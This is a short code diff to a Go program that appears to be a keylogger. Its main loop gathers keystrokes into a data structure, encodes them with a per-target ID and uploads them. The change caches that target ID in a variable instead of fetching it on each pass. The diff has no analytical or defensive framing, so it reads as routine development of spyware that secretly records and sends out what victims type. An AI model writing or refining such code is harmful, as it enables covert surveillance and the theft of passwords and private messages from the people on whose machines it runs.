@@ -64,6 +64,7 @@ func main() {
 	var keys KeyboardDataStruct = KeyboardDataStruct{
 		Contents: []string{},
 	}
+	var TARGET_ID string = getTargetID()
 
 	// implement graceful exit
 	cleanupOnSigterm(file, writer)
@@ -141,7 +142,7 @@ func main() {
 	go recoverer(-1, 3, func() {
 		for {
 			// encode data
-			encodedData := encodeUploadData(keys, getTargetID())
+			encodedData := encodeUploadData(keys, TARGET_ID)
 			// upload data
 			uploadData(encodedData)
 			// reset `key.Contents`
